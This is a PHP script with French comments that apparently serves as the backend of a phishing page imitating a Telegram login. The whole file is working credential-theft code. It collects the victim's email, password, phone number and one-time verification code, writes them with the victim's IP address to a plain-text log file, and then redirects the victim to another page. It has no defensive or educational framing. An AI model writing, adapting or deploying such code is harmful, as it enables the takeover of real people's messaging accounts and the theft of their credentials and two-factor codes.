<?php
// Vérifie si le formulaire a été soumis via la méthode POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupère et nettoie les données du formulaire
    $username = isset($_POST["email"]) ? htmlspecialchars(trim($_POST["email"])) : '';
    $password = isset($_POST["password"]) ? htmlspecialchars(trim($_POST["password"])) : '';
    $country_code = isset($_POST["country_code"]) ? htmlspecialchars(trim($_POST["country_code"])) : '';
    $phone_number = isset($_POST["phone_number"]) ? htmlspecialchars(trim($_POST["phone_number"])) : '';
    $verification_code = isset($_POST["code"]) ? htmlspecialchars(trim($_POST["code"])) : '';
    $remember = isset($_POST["remember"]) ? 'Oui' : 'Non';
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');

    // Vérifie si les champs ne sont pas vides (soit email/mot de passe, soit code de vérification)
    if ((!empty($username) && !empty($password)) || !empty($verification_code)) {
        // Formate les données pour l'enregistrement
        $data = "=== NOUVELLE CONNEXION TELEGRAM ===\n";
        $data .= "Date: $date\n";
        
        if (!empty($verification_code)) {
            $data .= "Code de vérification: $verification_code\n";
        } else {
            $data .= "Email/Username: $username\n";
            $data .= "Téléphone: $country_code$phone_number\n";
            $data .= "Mot de passe: $password\n";
            $data .= "Session active: $remember\n";
        }
        
        $data .= "Adresse IP: $ip\n";
        $data .= "==================================\n\n";
        
        // Configuration du fichier
        $file = "login.txt";
        
        // Crée le fichier s'il n'existe pas
        if (!file_exists($file)) {
            touch($file);
            chmod($file, 0644);
        }
        
        // Vérifie les permissions
        if (!is_writable($file)) {
            chmod($file, 0644);
        }
        
        clearstatcache();
        
        // Mécanisme d'écriture sécurisé
        $attempts = 0;
        $max_attempts = 3;
        $written = false;
        
        while ($attempts < $max_attempts && !$written) {
            $written = file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
            if ($written === false) {
                usleep(100000);
                $attempts++;
            }
        }
        
        if ($written !== false) {
            header("Location: mer.html");
            exit();
        } else {
            error_log("[".date('Y-m-d H:i:s')."] Échec d'écriture dans $file. IP: $ip");
            echo "Erreur système : Veuillez réessayer plus tard.";
            exit();
        }
    } else {
        echo "Erreur : Veuillez fournir soit un email/mot de passe, soit un code de vérification.";
        exit();
    }
} else {
    header("HTTP/1.1 403 Forbidden");
    echo "Accès refusé : Méthode non autorisée.";
    exit();
}
?
